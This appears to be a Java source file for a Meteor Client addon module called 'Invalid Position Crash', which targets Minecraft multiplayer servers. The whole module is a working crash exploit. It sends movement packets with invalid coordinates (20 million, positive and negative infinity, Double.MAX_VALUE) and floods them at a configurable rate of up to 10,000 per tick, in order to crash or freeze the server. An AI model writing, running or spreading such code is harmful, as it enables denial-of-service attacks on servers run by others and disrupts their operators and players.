package im.hira.tweaks.modules.Crash;

import meteordevelopment.meteorclient.events.entity.player.PlayerMoveEvent;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;
import im.hira.tweaks.MCM4MC;

public class InvalidPositionCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> packetMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("Which position crash to use.")
        .defaultValue(Modes.TWENTY_MILLION)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(500)
        .min(1)
        .sliderMin(1)
        .sliderMax(10000)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public InvalidPositionCrash() {
        super(MCM4MC.JH_CRASH_CAT, "Invalid Position Crash", "Attempts to crash the server by sending invalid position packets. (may freeze or kick you)");
    }

    private boolean Switch = false;

    @Override
    public void onActivate() {
        if (Utils.canUpdate()) {
            switch (packetMode.get()) {

                case TWENTY_MILLION -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                        new Vec3d(20_000_000, 255, 20_000_000), true, true
                    ));
                    toggle();
                }

                case INFINITY -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                        new Vec3d(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY), true, true
                    ));
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                        new Vec3d(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY), true, true
                    ));
                    toggle();
                }

                case TP -> mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                    new Vec3d(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY), true, true
                ));
            }
        }
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        switch (packetMode.get()) {
            case TP -> {
                for (double i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                        new Vec3d(mc.player.getX(), mc.player.getY() + (i * 9), mc.player.getZ()), true, true
                    ));
                }
                for (double i = 0; i < amount.get() * 10; i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                        new Vec3d(mc.player.getX(), mc.player.getY() + (i * (double) amount.get()), mc.player.getZ() + (i * 9)), true, true
                    ));
                }
            }
            case VELT -> {
                if (mc.player.age < 100) {
                    for (int i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            new Vec3d(mc.player.getX(), mc.player.getY() - 1.0D, mc.player.getZ()), false, true
                        ));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            new Vec3d(mc.player.getX(), Double.MAX_VALUE, mc.player.getZ()), false, true
                        ));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            new Vec3d(mc.player.getX(), mc.player.getY() - 1.0D, mc.player.getZ()), false, true
                        ));
                    }
                }
            }
        }
    }

    @EventHandler
    private void onMove(PlayerMoveEvent event) {
        if (Utils.canUpdate() && packetMode.get() == Modes.SWITCH) {
            if (Switch) {
                event.movement = new Vec3d(Double.MIN_VALUE, event.movement.getY(), Double.MIN_VALUE);
                Switch = false;
            } else {
                event.movement = new Vec3d(Double.MAX_VALUE, event.movement.getY(), Double.MAX_VALUE);
                Switch = true;
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Modes {
        TWENTY_MILLION,
        INFINITY,
        TP,
        VELT,
        SWITCH
    }
}
